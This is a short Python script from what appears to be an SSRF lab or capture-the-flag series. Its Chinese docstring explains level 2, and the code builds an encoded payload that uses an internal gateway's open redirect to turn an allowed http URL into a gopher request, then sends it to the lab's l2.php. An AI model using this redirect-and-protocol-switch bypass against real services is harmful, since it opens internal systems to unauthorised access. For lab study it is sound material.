"""L2 · 白名单 + 302 换协议

过滤只检查前缀，白名单写死成内部网关。但网关自己提供 /r?to= 的跳转，
而 curl 跟随重定向时不校验协议 —— 于是 http 跳到 gopher。

关键点：to 参数里的 : 和 / 必须编码，否则会被 URL 解析吃掉。

跑法：
    python3 02_redirect_302.py
"""

import sys
import urllib.parse

from _util import report, send

GATEWAY = "http://legacy-internal:8081"
TARGET = GATEWAY + "/r?to=" + urllib.parse.quote(
    "gopher://legacy-internal:70/0/l2.txt", safe=""
)


def main():
    print("投递 URL:", TARGET)
    print()
    body = send("l2.php", TARGET)
    return 0 if report(body) else 1


if __name__ == "__main__":
    sys.exit(main())
